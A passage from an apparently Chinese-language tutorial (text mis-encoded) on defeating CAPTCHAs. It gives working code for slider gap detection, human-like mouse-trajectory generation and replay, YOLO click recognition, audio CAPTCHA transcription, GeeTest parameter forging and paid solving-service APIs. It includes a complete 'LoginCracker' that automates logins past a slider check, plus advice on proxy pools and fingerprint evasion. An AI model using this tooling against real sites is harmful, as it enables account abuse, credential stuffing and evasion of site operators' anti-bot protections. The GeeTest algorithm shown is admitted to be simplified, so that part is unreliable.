    orb = cv2.ORB_create()

    kp1, des1 = orb.detectAndCompute(original_img, None)
    kp2, des2 = orb.detectAndCompute(rotated_img, None)

    # ç‰¹å¾åŒ¹é…
    bf = cv2.BFMatcher(cv2.NORM_HAMMING, crossCheck=True)
    matches = bf.match(des1, des2)
    matches = sorted(matches, key=lambda x: x.distance)

    # è®¡ç®—æ—‹è½¬è§’åº¦ï¼ˆç®€åŒ–ç‰ˆï¼‰
    # å®é™…å®ç°éœ€è¦æ›´å¤æ‚çš„å‡ ä½•å˜æ¢
    angle = calculate_angle_from_matches(kp1, kp2, matches)

    return angle
</code></pre>
<hr />
<h3>1.3 ç‚¹é€‰éªŒè¯ç  (Click-based CAPTCHA)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>ç»™å‡ºä¸€å¼ å›¾ç‰‡å’Œæ–‡å­—æç¤º</li>
<li>è¦æ±‚æŒ‰é¡ºåºç‚¹å‡»å›¾ä¸­çš„ç‰¹å®šå¯¹è±¡</li>
<li>ç¤ºä¾‹ï¼š&quot;è¯·ä¾æ¬¡ç‚¹å‡»å›¾ä¸­çš„çº¢ç»¿ç¯&quot;</li>
</ul>
<p><strong>ä»£è¡¨äº§å“</strong>:</p>
<ul>
<li>è…¾è®¯é˜²æ°´å¢™</li>
<li>12306 éªŒè¯ç ï¼ˆæ—©æœŸï¼‰</li>
</ul>
<p><strong>è¯†åˆ«æŠ€æœ¯</strong>:</p>
<ul>
<li><strong>YOLO</strong>: ç›®æ ‡æ£€æµ‹ç¥ç»ç½‘ç»œ</li>
<li><strong>åˆ†ç±»å™¨</strong>: è®­ç»ƒé’ˆå¯¹ç‰¹å®šç±»åˆ«çš„è¯†åˆ«å™¨</li>
</ul>
<p><strong>YOLO è¯†åˆ«ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python">from ultralytics import YOLO

# åŠ è½½é¢„è®­ç»ƒæ¨¡å‹
model = YOLO('yolov8n.pt')

# è¯†åˆ«å›¾ä¸­çš„å¯¹è±¡
results = model('captcha.jpg')

# æå–çº¢ç»¿ç¯çš„ä½ç½®
traffic_lights = []
for r in results:
    boxes = r.boxes
    for box in boxes:
        class_id = int(box.cls[0])
        if class_id == 9:  # COCO æ•°æ®é›†ä¸­çº¢ç»¿ç¯çš„ç±»åˆ« ID
            x, y, w, h = box.xywh[0].tolist()
            traffic_lights.append((int(x), int(y)))

print(f&quot;æ£€æµ‹åˆ°çš„çº¢ç»¿ç¯ä½ç½®: {traffic_lights}&quot;)
# è¾“å‡º: [(120, 80), (300, 150), ...]

# æŒ‰è¦æ±‚é¡ºåºç‚¹å‡»
for x, y in traffic_lights:
    click(x, y)
</code></pre>
<hr />
<h3>1.4 è¡Œä¸ºéªŒè¯ç  (Behavioral CAPTCHA)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>ä¸æ˜¯å•çº¯çš„å›¾åƒè¯†åˆ«</li>
<li>åˆ†æé¼ æ ‡è½¨è¿¹ã€ç‚¹å‡»é€Ÿåº¦ã€è®¾å¤‡æŒ‡çº¹ç­‰è¡Œä¸ºç‰¹å¾</li>
<li>é€šå¸¸æ˜¯&quot;æ— æ„ŸéªŒè¯&quot;</li>
</ul>
<p><strong>ä»£è¡¨äº§å“</strong>:</p>
<ul>
<li>Google reCAPTCHA v3</li>
<li>é˜¿é‡Œäº‘æ»‘åŠ¨éªŒè¯</li>
</ul>
<p><strong>å…³é”®æŒ‡æ ‡</strong>:</p>
<ul>
<li><strong>é¼ æ ‡è½¨è¿¹</strong>: æ›²çº¿è‡ªç„¶åº¦ã€åŠ é€Ÿåº¦å˜åŒ–</li>
<li><strong>è®¾å¤‡æŒ‡çº¹</strong>: Canvasã€WebGLã€AudioContext</li>
<li><strong>ç¯å¢ƒç‰¹å¾</strong>: User-Agentã€æ—¶åŒºã€è¯­è¨€ã€å±å¹•åˆ†è¾¨ç‡</li>
<li><strong>è¡Œä¸ºæ—¶åº</strong>: åœç•™æ—¶é—´ã€æ“ä½œé€Ÿåº¦</li>
</ul>
<p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>
<ol>
<li><strong>æ¨¡æ‹ŸçœŸå®è¡Œä¸º</strong> (è§è½¨è¿¹æ¨¡æ‹Ÿç« èŠ‚)</li>
<li><strong>ç»•è¿‡æŒ‡çº¹æ£€æµ‹</strong> (è§ <a href="#section-34">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a>)</li>
<li><strong>ä½¿ç”¨çœŸå®æµè§ˆå™¨</strong> (Puppeteer + Stealth æ’ä»¶)</li>
</ol>
<hr />
<h3>1.5 è¯­éŸ³éªŒè¯ç  (Audio CAPTCHA)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>æ’­æ”¾å«æœ‰æ•°å­—/å­—æ¯çš„è¯­éŸ³</li>
<li>é€šå¸¸æ˜¯ä¸ºè§†éšœäººå£«æä¾›çš„æ›¿ä»£æ–¹æ¡ˆ</li>
</ul>
<p><strong>è¯†åˆ«æŠ€æœ¯</strong>:</p>
<ul>
<li><strong>è¯­éŸ³è¯†åˆ«</strong>: Google Speech API, Baidu ASR</li>
<li><strong>æ·±åº¦å­¦ä¹ </strong>: DeepSpeech, Wav2Vec</li>
</ul>
<pre><code class="language-python">import speech_recognition as sr

# ä¸‹è½½éŸ³é¢‘æ–‡ä»¶
audio_url = &quot;https://example.com/captcha/audio.wav&quot;
# ...ä¸‹è½½åˆ°æœ¬åœ°

# ä½¿ç”¨ Google Speech API è¯†åˆ«
recognizer = sr.Recognizer()
with sr.AudioFile(&quot;captcha.wav&quot;) as source:
    audio = recognizer.record(source)

try:
    text = recognizer.recognize_google(audio)
    print(f&quot;è¯†åˆ«ç»“æœ: {text}&quot;)
except sr.UnknownValueError:
    print(&quot;æ— æ³•è¯†åˆ«&quot;)
</code></pre>
<hr />
<h2>2. è½¨è¿¹æ¨¡æ‹Ÿ (Trajectory Simulation)</h2>
<p>è¯†åˆ«å‡º&quot;ç¼ºå£ä½ç½®&quot;åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œå…³é”®æ˜¯<strong>å¦‚ä½•æ»‘è¿‡å»</strong>ã€‚åŒ€é€Ÿç›´çº¿è¿åŠ¨ä¸€å®šä¼šè¢«åˆ¤å®šä¸ºæœºå™¨äººã€‚</p>
<h3>2.1 è´å¡å°”æ›²çº¿è½¨è¿¹</h3>
<p><strong>åŸç†</strong>: ä½¿ç”¨ä¸‰æ¬¡è´å¡å°”æ›²çº¿æ¨¡æ‹Ÿäººæ‰‹çš„åŠ é€Ÿ-åŒ€é€Ÿ-å‡é€Ÿè¿‡ç¨‹</p>
<p><strong>Python å®ç°</strong>:</p>
<pre><code class="language-python">import numpy as np
import random

def ease_out_quad(x):
    &quot;&quot;&quot;ç¼“å‡ºå‡½æ•°&quot;&quot;&quot;
    return 1 - (1 - x) ** 2

def ease_in_quad(x):
    &quot;&quot;&quot;ç¼“å…¥å‡½æ•°&quot;&quot;&quot;
    return x ** 2

def ease_out_back(x):
    &quot;&quot;&quot;å›å¼¹å‡½æ•°&quot;&quot;&quot;
    c1 = 1.70158
    c3 = c1 + 1
    return 1 + c3 * pow(x - 1, 3) + c1 * pow(x - 1, 2)

def generate_trajectory(distance, overshoot=True):
    &quot;&quot;&quot;
    ç”Ÿæˆæ»‘åŠ¨è½¨è¿¹

    :param distance: æ€»è·ç¦»
    :param overshoot: æ˜¯å¦è¿‡å†²ï¼ˆæ»‘è¿‡å¤´å†å›æ¥ï¼‰
    :return: [(x, y, t), ...] è½¨è¿¹ç‚¹åˆ—è¡¨
    &quot;&quot;&quot;
    trajectory = []

    # å‚æ•°è®¾ç½®
    if overshoot:
        # è¿‡å†²ï¼šæ»‘åˆ°distance + 5~10pxï¼Œå†å›æ¥
        overshoot_distance = distance + random.randint(5, 10)
    else:
        overshoot_distance = distance

    # ç¬¬ä¸€é˜¶æ®µï¼šåŠ é€Ÿé˜¶æ®µ (30%)
    current = 0
    t = 0
    while current &lt; overshoot_distance * 0.3:
        t += random.randint(10, 20)  # æ—¶é—´é—´éš” 10-20ms
        ratio = current / (overshoot_distance * 0.3)
        move = ease_in_quad(ratio) * 5 + random.uniform(0, 2)
        current += move

        # æ·»åŠ yè½´æŠ–åŠ¨
        y = random.randint(-2, 2)
        trajectory.append((int(current), y, t))

    # ç¬¬äºŒé˜¶æ®µï¼šåŒ€é€Ÿé˜¶æ®µ (40%)
    while current &lt; overshoot_distance * 0.7:
        t += random.randint(10, 15)
        move = random.uniform(3, 5)
        current += move
        y = random.randint(-3, 3)
        trajectory.append((int(current), y, t))

    # ç¬¬ä¸‰é˜¶æ®µï¼šå‡é€Ÿé˜¶æ®µ (30%)
    start_decel = current
    while current &lt; overshoot_distance:
        t += random.randint(15, 25)
        ratio = (current - start_decel) / (overshoot_distance - start_decel)
        move = (1 - ease_out_quad(ratio)) * 3 + random.uniform(0, 1)
        current += move
        y = random.randint(-2, 2)
        trajectory.append((int(current), y, t))

    # å¦‚æœæœ‰è¿‡å†²ï¼Œæ·»åŠ å›é€€é˜¶æ®µ
    if overshoot:
        back_to = distance
        while current &gt; back_to:
            t += random.randint(10, 15)
            move = random.uniform(1, 3)
            current -= move
            y = random.randint(-1, 1)
            trajectory.append((int(current), y, t))

    return trajectory

# ä½¿ç”¨ç¤ºä¾‹
trajectory = generate_trajectory(200, overshoot=True)
print(f&quot;ç”Ÿæˆäº† {len(trajectory)} ä¸ªè½¨è¿¹ç‚¹&quot;)
# è¾“å‡º: [(3, 1, 15), (7, -1, 28), (12, 0, 43), ...]
</code></pre>
<hr />
<h3>2.2 çœŸå®è½¨è¿¹é‡‡é›†ä¸é‡æ”¾</h3>
<p><strong>æ€è·¯</strong>: è®°å½•çœŸäººæ»‘åŠ¨çš„è½¨è¿¹ï¼Œå»ºç«‹è½¨è¿¹åº“ï¼Œæ¯æ¬¡éšæœºé€‰æ‹©ä¸€æ¡å¹¶ç¼©æ”¾</p>
<p><strong>é‡‡é›†è„šæœ¬</strong> (åœ¨æµè§ˆå™¨ Console ä¸­è¿è¡Œ):</p>
<pre><code class="language-javascript">let trajectory = [];
let startTime = null;

document.addEventListener(&quot;mousedown&quot;, function (e) {
  if (e.target.className.includes(&quot;slider&quot;)) {
    startTime = Date.now();
    trajectory = [];

    document.addEventListener(&quot;mousemove&quot;, recordMove);
    document.addEventListener(&quot;mouseup&quot;, endRecording);
  }
});

function recordMove(e) {
  if (startTime) {
    trajectory.push({
      x: e.clientX,
      y: e.clientY,
      t: Date.now() - startTime,
    });
  }
}

function endRecording() {
  console.log(JSON.stringify(trajectory));
  copy(JSON.stringify(trajectory)); // è‡ªåŠ¨å¤åˆ¶åˆ°å‰ªè´´æ¿

  document.removeEventListener(&quot;mousemove&quot;, recordMove);
  document.removeEventListener(&quot;mouseup&quot;, endRecording);
}
</code></pre>
<p><strong>é‡æ”¾ä¸ç¼©æ”¾</strong>:</p>
<pre><code class="language-python">import json

def scale_trajectory(original_trajectory, target_distance):
    &quot;&quot;&quot;
    ç¼©æ”¾è½¨è¿¹ä»¥é€‚åº”æ–°çš„è·ç¦»

    :param original_trajectory: åŸå§‹è½¨è¿¹ [{'x': 100, 'y': 0, 't': 150}, ...]
    :param target_distance: ç›®æ ‡è·ç¦»
    :return: ç¼©æ”¾åçš„è½¨è¿¹
    &quot;&quot;&quot;
    # è®¡ç®—åŸå§‹è·ç¦»
    original_distance = original_trajectory[-1]['x'] - original_trajectory[0]['x']

    # è®¡ç®—ç¼©æ”¾æ¯”ä¾‹
    scale = target_distance / original_distance

    # ç¼©æ”¾è½¨è¿¹
    scaled_trajectory = []
    base_x = original_trajectory[0]['x']

    for point in original_trajectory:
        scaled_x = (point['x'] - base_x) * scale
        scaled_trajectory.append({
            'x': int(scaled_x),
            'y': point['y'],
            't': point['t']
        })

    return scaled_trajectory

# åŠ è½½è½¨è¿¹åº“
with open('trajectories.json', 'r') as f:
    trajectory_library = json.load(f)

# éšæœºé€‰æ‹©ä¸€æ¡è½¨è¿¹
import random
trajectory = random.choice(trajectory_library)

# ç¼©æ”¾åˆ°ç›®æ ‡è·ç¦»
scaled_trajectory = scale_trajectory(trajectory, gap_x)
</code></pre>
<hr />
<h3>2.3 Puppeteer ghost-cursor æ’ä»¶</h3>
<p><strong>å®‰è£…</strong>:</p>
<pre><code class="language-bash">npm install ghost-cursor
</code></pre>
<p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer&quot;);
const { createCursor } = require(&quot;ghost-cursor&quot;);

(async () =&gt; {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();
  const cursor = createCursor(page);

  await page.goto(&quot;https://example.com/captcha&quot;);

  // æ‰¾åˆ°æ»‘å—å…ƒç´ 
  const slider = await page.$(&quot;.slider-button&quot;);
  const sliderBox = await slider.boundingBox();

  // è®¡ç®—ç›®æ ‡ä½ç½®ï¼ˆå‡è®¾ç¼ºå£åœ¨ 200px å¤„ï¼‰
  const targetX = sliderBox.x + 200;
  const targetY = sliderBox.y + sliderBox.height / 2;

  // ä½¿ç”¨ ghost-cursor ç§»åŠ¨é¼ æ ‡ï¼ˆè‡ªåŠ¨ç”Ÿæˆé€¼çœŸè½¨è¿¹ï¼‰
  await cursor.move(sliderBox.x, sliderBox.y);
  await cursor.click(); // æŒ‰ä¸‹é¼ æ ‡

  // ç§»åŠ¨åˆ°ç›®æ ‡ä½ç½®ï¼ˆåŒ…å«éšæœºæŠ–åŠ¨å’Œæ›²çº¿ï¼‰
  await cursor.move(targetX, targetY, {
    waitForSelector: false,
    paddingPercentage: 10, // 10% çš„éšæœºåç§»
  });

  await page.mouse.up(); // é‡Šæ”¾é¼ æ ‡

  await browser.close();
})();
</code></pre>
<hr />
<h2>3. åè®®ç ´è§£ (Protocol Reverse)</h2>
<p>æœ‰äº›éªŒè¯ç ä¸éœ€è¦æ¨¡æ‹Ÿè½¨è¿¹ï¼Œç›´æ¥ç ´è§£å…¶åŠ å¯†å‚æ•°å³å¯ã€‚</p>
<h3>3.1 æéªŒ (GeeTest) åè®®åˆ†æ</h3>
<p><strong>æµç¨‹</strong>:</p>
<ol>
<li>åˆå§‹åŒ–ï¼š<code>GET /api/captcha/init</code></li>
<li>è·å–å›¾ç‰‡ï¼š<code>GET /captcha/bg/{challenge}.jpg</code></li>
<li>éªŒè¯ï¼š<code>POST /api/captcha/verify</code></li>
</ol>
<p><strong>éªŒè¯å‚æ•°</strong>:</p>
<pre><code class="language-javascript">{
    &quot;challenge&quot;: &quot;abc123...&quot;,  // æŒ‘æˆ˜ç 
    &quot;validate&quot;: &quot;def456...&quot;,   // åŠ å¯†åçš„è½¨è¿¹
    &quot;seccode&quot;: &quot;validate|jordan&quot;  // validate + &quot;|jordan&quot;
}
</code></pre>
<p><strong>validate ç”Ÿæˆé€»è¾‘</strong> (ç®€åŒ–ç‰ˆ):</p>
<pre><code class="language-javascript">// æéªŒåŠ å¯†ç®—æ³•ï¼ˆå·²å…¬å¼€éƒ¨åˆ†ï¼‰
function get_validate(trajectory, challenge) {
  // 1. ç¼–ç è½¨è¿¹
  let encoded_trajectory = encode_trajectory(trajectory);

  // 2. ä¸ challenge è¿›è¡Œè¿ç®—
  let combined = encoded_trajectory + challenge;

  // 3. MD5 + Base64
  let validate = md5(combined).substring(0, 32);

  return validate;
}

function encode_trajectory(trajectory) {
  // è½¨è¿¹ç¼–ç ï¼ˆå®é™…æ›´å¤æ‚ï¼ŒåŒ…å«åŠ å¯†å’Œå‹ç¼©ï¼‰
  let encoded = &quot;&quot;;
  for (let point of trajectory) {
    encoded +=
      int_to_char(point.x) + int_to_char(point.y) + int_to_char(point.t);
  }
  return encoded;
}
</code></pre>
<p><strong>Python ç ´è§£ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python">import requests
import hashlib

def crack_geetest(gap_x):
    &quot;&quot;&quot;ç ´è§£æéªŒæ»‘å—éªŒè¯&quot;&quot;&quot;

    # 1. åˆå§‹åŒ–è·å– challenge
    init_url = &quot;https://api.geetest.com/get.php&quot;
    response = requests.get(init_url, params={
        'gt': 'your_gt_key',
        't': int(time.time() * 1000)
    })
    data = response.json()
    challenge = data['challenge']

    # 2. ç”Ÿæˆè½¨è¿¹
    trajectory = generate_trajectory(gap_x)

    # 3. è®¡ç®— validate (ç®€åŒ–ç‰ˆï¼Œå®é™…éœ€è¦é€†å‘å®Œæ•´ç®—æ³•)
    validate = calculate_validate(trajectory, challenge)

    # 4. æäº¤éªŒè¯
    verify_url = &quot;https://api.geetest.com/ajax.php&quot;
    result = requests.post(verify_url, data={
        'gt': 'your_gt_key',
        'challenge': challenge,
        'validate': validate,
        'seccode': validate + '|jordan'
    })

    return result.json()
</code></pre>
<p><strong>æ³¨æ„</strong>: çœŸå®çš„æéªŒç®—æ³•éå¸¸å¤æ‚ï¼ŒåŒ…å«å¤šé‡åŠ å¯†ã€æ··æ·†å’ŒæœåŠ¡å™¨ç«¯éªŒè¯ã€‚ä¸Šè¿°ä»£ç ä»…ä¸ºç¤ºæ„ã€‚</p>
<hr />
<h3>3.2 reCAPTCHA ä»¤ç‰Œè·å–</h3>
<p><strong>Google reCAPTCHA v2</strong>:</p>
<pre><code class="language-python">from selenium import webdriver
import time

driver = webdriver.Chrome()
driver.get('https://www.google.com/recaptcha/api2/demo')

# æ‰¾åˆ° reCAPTCHA iframe
iframe = driver.find_element_by_css_selector('iframe[src*=&quot;recaptcha&quot;]')
driver.switch_to.frame(iframe)

# ç‚¹å‡»å¤é€‰æ¡†
checkbox = driver.find_element_by_id('recaptcha-anchor')
checkbox.click()

# ç­‰å¾…éªŒè¯å®Œæˆ
time.sleep(3)

# åˆ‡å›ä¸»é¡µé¢è·å– token
driver.switch_to.default_content()
token = driver.find_element_by_id('g-recaptcha-response').get_attribute('value')
print(f&quot;reCAPTCHA Token: {token}&quot;)
</code></pre>
<hr />
<h2>4. å•†ä¸šæ‰“ç å¹³å°å¯¹æ¯”</h2>
<p>å½“æŠ€æœ¯æ–¹æ¡ˆæˆæœ¬è¿‡é«˜æˆ–æˆåŠŸç‡ä¸ç¨³å®šæ—¶ï¼Œå•†ä¸šæ‰“ç å¹³å°æ˜¯æœ€ä½³é€‰æ‹©ã€‚</p>
<table>
<thead>
<tr>
  <th>å¹³å°</th>
  <th>ä»·æ ¼</th>
  <th>æ”¯æŒç±»å‹</th>
  <th>æˆåŠŸç‡</th>
  <th>å“åº”æ—¶é—´</th>
  <th>API å‹å¥½åº¦</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://2captcha.com/">2Captcha</a></strong></td>
  <td>$2.99/1000 æ¬¡</td>
  <td>æ–‡å­—ã€reCAPTCHAã€hCaptchaã€GeeTest</td>
  <td>90%+</td>
  <td>10-30 ç§’</td>
  <td>â­â­â­â­â­</td>
</tr>
<tr>
  <td><strong><a href="https://anti-captcha.com/">Anti-Captcha</a></strong></td>
  <td>$2.00/1000 æ¬¡</td>
  <td>å…¨ç±»å‹</td>
  <td>92%+</td>
  <td>15-40 ç§’</td>
  <td>â­â­â­â­â­</td>
</tr>
<tr>
  <td><strong><a href="https://www.capsolver.com/">CapSolver</a></strong></td>
  <td>$0.80/1000 æ¬¡</td>
  <td>reCAPTCHAã€hCaptchaã€FunCaptcha</td>
  <td>88%+</td>
  <td>20-50 ç§’</td>
  <td>â­â­â­â­</td>
</tr>
<tr>
  <td><strong><a href="https://www.deathbycaptcha.com/">Death By Captcha</a></strong></td>
  <td>$1.39/1000 æ¬¡</td>
  <td>æ–‡å­—ã€å›¾ç‰‡</td>
  <td>85%+</td>
  <td>30-60 ç§’</td>
  <td>â­â­â­</td>
</tr>
<tr>
  <td><strong><a href="https://jytong.net/">æéªŒé€š</a></strong> (å›½å†…)</td>
  <td>Â¥0.5/æ¬¡</td>
  <td>æéªŒä¸“ç”¨</td>
  <td>95%+</td>
  <td>5-15 ç§’</td>
  <td>â­â­â­â­</td>
</tr>
<tr>
  <td><strong><a href="https://www.chaojiying.com/">è¶…çº§é¹°</a></strong> (å›½å†…)</td>
  <td>Â¥0.1-0.6/æ¬¡</td>
  <td>å›½å†…éªŒè¯ç </td>
  <td>80%+</td>
  <td>10-30 ç§’</td>
  <td>â­â­â­</td>
</tr>
</tbody>
</table>
<h3>4.1 2Captcha ä½¿ç”¨ç¤ºä¾‹</h3>
<p><strong>Python SDK</strong>:</p>
<pre><code class="language-bash">pip install 2captcha-python
</code></pre>
<p><strong>ä»£ç ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python">from twocaptcha import TwoCaptcha

# åˆå§‹åŒ–
solver = TwoCaptcha('YOUR_API_KEY')

# 1. æ–‡å­—éªŒè¯ç 
result = solver.normal('captcha.png')
print(result['code'])  # è¾“å‡º: &quot;AB3CD&quot;

# 2. reCAPTCHA v2
result = solver.recaptcha(
    sitekey='6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-',
    url='https://example.com/login'
)
print(result['code'])  # reCAPTCHA token

# 3. hCaptcha
result = solver.hcaptcha(
    sitekey='10000000-ffff-ffff-ffff-000000000001',
    url='https://example.com'
)

# 4. GeeTest
result = solver.geetest(
    gt='geetest_gt',
    challenge='geetest_challenge',
    url='https://example.com'
)
print(result)  # {'challenge': '...', 'validate': '...', 'seccode': '...'}
</code></pre>
<hr />
<h3>4.2 è‡ªå»ºæ‰“ç å¹³å°</h3>
<p>å¯¹äºå¤§è§„æ¨¡éœ€æ±‚ï¼Œå¯ä»¥è€ƒè™‘è‡ªå»ºäººå·¥æ‰“ç å¹³å°ï¼š</p>
<p><strong>æ¶æ„</strong>:</p>
<pre><code>çˆ¬è™«æœåŠ¡å™¨ â†’ ä»»åŠ¡é˜Ÿåˆ— (Redis) â†’ æ‰“ç å·¥ä½œå° (Web) â†’ æ‰“ç å‘˜
</code></pre>
<p><strong>æˆæœ¬ä¼°ç®—</strong>:</p>
<ul>
<li>æ‰“ç å‘˜å·¥èµ„: Â¥0.05-0.10/æ¬¡</li>
<li>æœåŠ¡å™¨æˆæœ¬: Â¥200/æœˆ</li>
<li>é€‚ç”¨åœºæ™¯: æ—¥å¤„ç†é‡ &gt; 100,000 æ¬¡</li>
</ul>
<hr />
<h2>5. å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ 1: ç ´è§£æŸç”µå•†ç½‘ç«™ç™»å½•æ»‘å—</h3>
<p><strong>ç›®æ ‡</strong>: è‡ªåŠ¨åŒ–ç™»å½•å¹¶è·å– Cookie</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li><p><strong>åˆ†æéªŒè¯æµç¨‹</strong>:</p>
<pre><code>1) POST /api/login â†’ è¿”å›éœ€è¦éªŒè¯
2) GET /captcha/init â†’ è·å–èƒŒæ™¯å›¾å’Œæ»‘å—
3) è¯†åˆ«ç¼ºå£ä½ç½®
4) ç”Ÿæˆè½¨è¿¹
5) POST /captcha/verify â†’ æäº¤è½¨è¿¹
6) éªŒè¯é€šè¿‡åé‡æ–°ç™»å½•
</code></pre>
</li>
<li><p><strong>å®Œæ•´ä»£ç </strong>:</p>
<pre><code class="language-python">import ddddocr
import requests
from trajectory import generate_trajectory

class LoginCracker:
    def __init__(self):
        self.session = requests.Session()
        self.det = ddddocr.DdddOcr(det=True)

    def login(self, username, password):
        # 1. å°è¯•ç™»å½•
        resp = self.session.post('https://example.com/api/login', data={
            'username': username,
            'password': password
        })

        if resp.json()['need_captcha']:
            # 2. éœ€è¦éªŒè¯ç 
            captcha_token = self.solve_captcha()

            # 3. å¸¦éªŒè¯ç é‡æ–°ç™»å½•
            resp = self.session.post('https://example.com/api/login', data={
                'username': username,
                'password': password,
                'captcha_token': captcha_token
            })

        return resp.json()

    def solve_captcha(self):
        # è·å–éªŒè¯ç å›¾ç‰‡
        init_resp = self.session.get('https://example.com/captcha/init').json()
        bg_url = init_resp['bg_url']

        # ä¸‹è½½èƒŒæ™¯å›¾
        bg_img = requests.get(bg_url).content

        # è¯†åˆ«ç¼ºå£
        result = self.det.detection(bg_img)
        gap_x = result['target'][0]

        # ç”Ÿæˆè½¨è¿¹
        trajectory = generate_trajectory(gap_x)

        # æäº¤éªŒè¯
        verify_resp = self.session.post('https://example.com/captcha/verify', json={
            'token': init_resp['token'],
            'trajectory': trajectory
        })

        return verify_resp.json()['captcha_token']

# ä½¿ç”¨
cracker = LoginCracker()
result = cracker.login('username', 'password')
print(result)
</code></pre>
</li>
</ol>
<hr />
<h3>æ¡ˆä¾‹ 2: ä½¿ç”¨ Puppeteer + 2Captcha ç ´è§£ reCAPTCHA</h3>
<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer&quot;);
const solver = require(&quot;2captcha&quot;);

(async () =&gt; {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  await page.goto(&quot;https://example.com/login&quot;);

  // è·å– reCAPTCHA sitekey
  const sitekey = await page.evaluate(() =&gt; {
    return document
      .querySelector(&quot;[data-sitekey]&quot;)
      .getAttribute(&quot;data-sitekey&quot;);
  });

  // è°ƒç”¨ 2Captcha è§£å†³
  const captchaSolver = new solver.Solver(&quot;YOUR_API_KEY&quot;);
  const result = await captchaSolver.recaptcha(sitekey, page.url());

  // æ³¨å…¥ token
  await page.evaluate((token) =&gt; {
    document.getElementById(&quot;g-recaptcha-response&quot;).innerHTML = token;
  }, result.data);

  // æäº¤è¡¨å•
  await page.click(&quot;#submit-button&quot;);

  await page.waitForNavigation();
  console.log(&quot;ç™»å½•æˆåŠŸ!&quot;);

  await browser.close();
})();
</code></pre>
<hr />
<h2>6. é˜²å¾¡å¯¹æŠ—</h2>
<h3>6.1 éªŒè¯ç æœåŠ¡å•†çš„é˜²å¾¡æ‰‹æ®µ</h3>
<table>
<thead>
<tr>
  <th>é˜²å¾¡æ‰‹æ®µ</th>
  <th>è¯´æ˜</th>
  <th>å¯¹æŠ—æ–¹æ³•</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>è®¾å¤‡æŒ‡çº¹</strong></td>
  <td>Canvasã€WebGLã€AudioContext</td>
  <td>Puppeteer Stealth æ’ä»¶</td>
</tr>
<tr>
  <td><strong>è¡Œä¸ºåˆ†æ</strong></td>
  <td>é¼ æ ‡è½¨è¿¹ã€é”®ç›˜èŠ‚å¥</td>
  <td>ghost-cursorã€çœŸå®è½¨è¿¹é‡æ”¾</td>
</tr>
<tr>
  <td><strong>IP é£æ§</strong></td>
  <td>é¢‘ç‡é™åˆ¶ã€é»‘åå•</td>
  <td>ä»£ç†æ± ã€ä½å®… IP</td>
</tr>
<tr>
  <td><strong>Token ç»‘å®š</strong></td>
  <td>ä»¤ç‰Œä¸è®¾å¤‡/ä¼šè¯ç»‘å®š</td>
  <td>ä¿æŒ Sessionã€Cookie</td>
</tr>
<tr>
  <td><strong>æ—¶é—´æˆ³æ ¡éªŒ</strong></td>
  <td>é™åˆ¶éªŒè¯ç æœ‰æ•ˆæœŸ</td>
  <td>åŠ å¿«è¯†åˆ«é€Ÿåº¦</td>
</tr>
<tr>
  <td><strong>é‡æ”¾æ£€æµ‹</strong></td>
  <td>æ£€æµ‹è½¨è¿¹æ˜¯å¦é‡å¤</td>
  <td>æ¯æ¬¡ç”Ÿæˆæ–°è½¨è¿¹</td>
</tr>
</tbody>
</table>
<hr />
<h3>6.2 æœ€ä½³å®è·µ</h3>
<ol>
<li><strong>ç»„åˆç­–ç•¥</strong>: è¯†åˆ« + æ‰“ç å¹³å° (è¯†åˆ«å¤±è´¥æ—¶é™çº§)</li>
<li><strong>é€Ÿç‡æ§åˆ¶</strong>: é¿å…çŸ­æ—¶é—´å¤§é‡è¯·æ±‚</li>
<li><strong>çœŸå®ç¯å¢ƒ</strong>: ä½¿ç”¨çœŸå®æµè§ˆå™¨è€Œéæ— å¤´æ¨¡å¼</li>
<li><strong>è½¨è¿¹å¤šæ ·æ€§</strong>: ä¸è¦ä½¿ç”¨å›ºå®šè½¨è¿¹æ¨¡æ¿</li>
<li><strong>å¼‚å¸¸å¤„ç†</strong>: éªŒè¯å¤±è´¥æ—¶é‡è¯•è€Œéå´©æºƒ</li>
</ol>
<hr />
<h2>7. å¸¸è§é—®é¢˜</h2>
<h3>Q1: ddddocr è¯†åˆ«ç‡ä¸é«˜æ€ä¹ˆåŠï¼Ÿ</h3>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<ul>
<li>å›¾åƒé¢„å¤„ç†ï¼šå»å™ªã€äºŒå€¼åŒ–ã€å¢å¼ºå¯¹æ¯”åº¦</li>
<li>å°è¯•ä¸åŒçš„ OCR å·¥å…·å¯¹æ¯”</li>
<li>è€ƒè™‘ä½¿ç”¨æ‰“ç å¹³å°</li>
</ul>
<h3>Q2: æ»‘å—æ€»æ˜¯éªŒè¯å¤±è´¥ï¼Ÿ</h3>
<p><strong>å¯èƒ½åŸå› </strong>:</p>
<ul>
<li>ç¼ºå£è¯†åˆ«ä¸å‡†ç¡®</li>
<li>è½¨è¿¹å¤ªå‡ï¼ˆåŒ€é€Ÿç›´çº¿ï¼‰</li>
<li>è®¾å¤‡æŒ‡çº¹è¢«è¯†åˆ«</li>
<li>IP è¢«é£æ§</li>
</ul>
<p><strong>è°ƒè¯•æ–¹æ³•</strong>:</p>
<ul>
<li>åœ¨æµè§ˆå™¨ä¸­æ‰‹åŠ¨éªŒè¯æ˜¯å¦é€šè¿‡</li>
<li>æ£€æŸ¥ Network é¢æ¿çš„éªŒè¯å“åº”</li>
<li>å¯¹æ¯”çœŸäººæ»‘åŠ¨çš„è½¨è¿¹</li>
</ul>
